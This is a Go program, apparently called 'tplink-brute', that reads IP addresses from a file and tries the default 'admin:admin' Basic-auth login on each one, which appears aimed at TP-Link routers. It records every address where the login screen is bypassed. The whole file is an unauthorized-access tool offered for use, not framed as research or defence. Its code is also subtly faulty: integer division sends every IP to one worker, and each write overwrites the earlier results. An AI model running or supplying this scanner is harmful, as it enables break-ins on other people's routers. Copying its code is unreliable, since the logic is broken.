package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
)

func main() {

	// When the input filename is not given
	if len(os.Args) != 2 {
		fmt.Println("Usage: tplink-brute [FILENAME]")
		return
	}

	// Reading the IPs from file
	iplist := readIP(os.Args[1])

	// Dividing the IPs to 5 equal parts
	// to send 5 concurrent goroutines
	length := len(iplist)
	partSlice1, partSlice2, partSlice3, partSlice4, partSlice5 := iplist[:(1/5)*length], iplist[(1/5)*length:(2/5)*length], iplist[(2/5)*length:(3/5)*length], iplist[(3/5)*length:(4/5)*length], iplist[(4/5)*length:]
	tmp := [][]string{partSlice1, partSlice2, partSlice3, partSlice4, partSlice5}

	outSlice := [][]string{}
	var wg sync.WaitGroup

	// 5 goroutines checking the ip for admin:admin credentials,
	// if it matches, it appends the ip to output slice
	for i := 0; i < 5; i++ {
		tmpOut := []string{}
		outSlice = append(outSlice, tmpOut)
		wg.Add(1)
		go func(wg *sync.WaitGroup, tmp []string, i int) {
			client := &http.Client{}
			for _, ip := range tmp {
				fmt.Println(ip)
				if checkIP(ip, client) {
					outSlice[i] = append(outSlice[i], ip)
				}
			}
			wg.Done()
		}(&wg, tmp[i], i)
	}

	// Main goroutine waits for additional goroutines
	wg.Wait()

	// Writes the matching IPs from output slice to 'output.txt' file
	for _, sl := range outSlice {
		err := writeIP("output.txt", sl)
		if err != nil {
			fmt.Println(err)
		}
	}
}

// Read the IPs from the given file to a slice
func readIP(filename string) []string {

	file, err := os.Open(os.Args[1])
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	// Storing the IPs from file to a slice
	iplist := []string{}
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		iplist = append(iplist, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		fmt.Println(err)
	}
	return iplist
}

// Checks if the default credentials match,
// returns true if it matches, false elsewise
func checkIP(ip string, client *http.Client) bool {

	req, err := http.NewRequest("GET", "http://"+ip, nil)
	if err != nil {
		fmt.Println(err)
		return false
	}

	// Adding 'Authorization' header to the request
	auth := "Basic "
	auth64 := auth + base64.StdEncoding.EncodeToString([]byte("admin:admin"))
	req.Header.Set("Authorization", auth64)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return false
	}

	if resp.StatusCode == 400 || resp.StatusCode == 401 {
		return false
	}
	fmt.Println(resp.StatusCode)

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return false
	}

	// If the response doesn't containt 'userName',
	// it means we're no longer in login screen
	if !strings.Contains(string(respBody), "userName") {
		return true
	}
	return false
}

// Writes the found IPs to the 'output.txt' file
func writeIP(filename string, values []string) error {

	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	// Writing the values of the slice to the output file
	for _, value := range values {
		fmt.Fprintln(file, value)
	}
	return nil
}
